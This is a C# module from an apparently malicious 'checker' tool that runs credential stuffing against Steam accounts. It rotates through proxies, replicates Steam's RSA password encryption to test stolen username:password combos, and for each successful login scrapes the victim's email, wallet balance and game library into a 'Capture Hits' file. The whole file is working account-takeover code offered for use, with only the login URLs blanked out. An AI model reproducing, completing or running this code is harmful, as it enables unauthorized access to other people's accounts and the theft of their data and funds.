using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Numerics;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using UHQKEK.Start;
using Console = Colorful.Console;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace UHQKEK.Modules.Capture
{
    class Steam
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                DateTimeOffset now = DateTimeOffset.UtcNow;
                Int32 unixTimestamp = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
                string time = DateTime.Now.ToString("yyyy'-'MM'-'dd:HH:mm:ss");
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                httpRequest.AddHeader("Content-Length", "39");
                httpRequest.AddHeader("Origin", "https://store.steampowered.com");
                httpRequest.AddHeader("Referer", "https://store.steampowered.com/login/");
                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                httpRequest.AddHeader("Host", "store.steampowered.com");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36");
                string str1 = httpRequest.Post("URL HERE", "donotcache=" + unixTimestamp + "&username=" + strArray1[0], "application/x-www-form-urlencoded").ToString();
                string pkey = Cryptography.LR(str1, "publickey_mod\":\"", "\", ").FirstOrDefault();
                string PEXP = Cryptography.LR(str1, "publickey_exp\":\"", "\", ").FirstOrDefault();
                string PTIME = Cryptography.LR(str1, "timestamp\":\"", "\", ").FirstOrDefault();
                string PP = RSAPkcs1Pad2(strArray1[1], pkey, PEXP);
                string PS = HttpUtility.UrlEncode(PP);
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                httpRequest.AddHeader("Origin", "https://store.steampowered.com");
                httpRequest.AddHeader("Referer", "https://store.steampowered.com/login/");
                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                httpRequest.AddHeader("Host", "store.steampowered.com");
                httpRequest.AddHeader("Accept", "*/*");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36");
                string str2 = httpRequest.Post("URL HERE", "donotcache=" + time + "&password=" + PS + "&username=" + strArray1[0] + "&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=" + PTIME + "&remember_login=false&tokentype=-1", "application/x-www-form-urlencoded").ToString();
                if (str2.Contains("success\":true"))
                {
                    string steamid = Cryptography.LR(str2, "{\"steamid\":\"", "\"").FirstOrDefault();
                    string tk69 = Cryptography.LR(str2, "\"token_secure\":\"", "\"").FirstOrDefault();
                    string auth = Cryptography.LR(str2, "\"auth\":\"", "\"").FirstOrDefault();
                    try
                    {
                        httpRequest.ClearAllHeaders();
                        httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                        httpRequest.AddHeader("Host", "store.steampowered.com");
                        httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36");
                        httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                        httpRequest.AddHeader("Referer", "https://store.steampowered.com/");
                        string str3 = httpRequest.Get("https://store.steampowered.com/account/").ToString();
                        string mail = Cryptography.LR(str3, "Email address:</span> <span class=\"account_data_field\">", "</span>").FirstOrDefault();
                        string bal = Cryptography.LR(str3, "class=\"accountData price\">", "</div>").FirstOrDefault();
                        string steamgaurd = "NO";
                        httpRequest.ClearAllHeaders();
                        httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                        httpRequest.AddHeader("Host", "store.steampowered.com");
                        httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40");
                        httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                        httpRequest.AddHeader("Referer", "https://steamcommunity.com/profiles/76561198081287737/");
                        httpRequest.AddHeader("sec-ch-ua", "\"Microsoft Edge\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"");
                        string str4 = httpRequest.Get("https://steamcommunity.com/profiles/" + steamid + "/games/?tab=all").ToString();
                        var Games = new List<string>();
                        Games = Cryptography.LR(str3, "name\":\"", "\"", true, false).ToList();
                        string Game = string.Join(" , ", Games);
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("");
                        }
                        Program.Save(combo + $" | Mail: {mail} | Balance: {bal} | Steam Gaurd: {steamgaurd} | Games: {Game}", "Steam Capture Hits");
                        return true;
                    }
                    catch
                    {
                        Interlocked.Increment(ref Program.Good);
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("");
                        }
                        Program.Save(combo, "Steam Cap error Hits");
                        return true;
                    }


                }
                else if (str2.Contains("The account name or password that you have entered is incorrect.") || str2.Contains("Incorrect") || str2.Contains("success\":false"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    return true;
                }
                else if (str2.Contains("Please verify your humanity by re-entering the characters in the captcha."))
                {
                    ++Program.Retrie;
                    return false;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch
            {
                ++Program.Retrie;
                return false;
            }
        }
        public static string RSAPkcs1Pad2(string message, string modulus, string exponent)
        {
            // Convert the public key components to numbers
            var n = HexToBigInteger(modulus);
            var e = HexToBigInteger(exponent);

            // (modulus.ToByteArray().Length - 1) * 8
            //modulus has 256 bytes multiplied by 8 bits equals 2048
            var encryptedNumber = Pkcs1Pad2(message, (2048 + 7) >> 3);

            // And now, the RSA encryption
            encryptedNumber = BigInteger.ModPow(encryptedNumber, e, n);

            //Reverse number and convert to base64
            var encryptedString = Convert.ToBase64String(encryptedNumber.ToByteArray().Reverse().ToArray());

            return encryptedString;
        }
        private static BigInteger HexToBigInteger(string hex)
        {
            return BigInteger.Parse("00" + hex, NumberStyles.AllowHexSpecifier);
        }
        private static BigInteger Pkcs1Pad2(string data, int keySize)
        {
            if (keySize < data.Length + 11)
                return new BigInteger();

            var buffer = new byte[256];
            var i = data.Length - 1;

            while (i >= 0 && keySize > 0)
            {
                buffer[--keySize] = (byte)data[i--];
            }

            // Padding, I think
            var random = new Random();
            buffer[--keySize] = 0;
            while (keySize > 2)
            {
                buffer[--keySize] = (byte)random.Next(1, 256);
                //buffer[--keySize] = 5;
            }

            buffer[--keySize] = 2;
            buffer[--keySize] = 0;

            Array.Reverse(buffer);

            return new BigInteger(buffer);
        }
    }
}
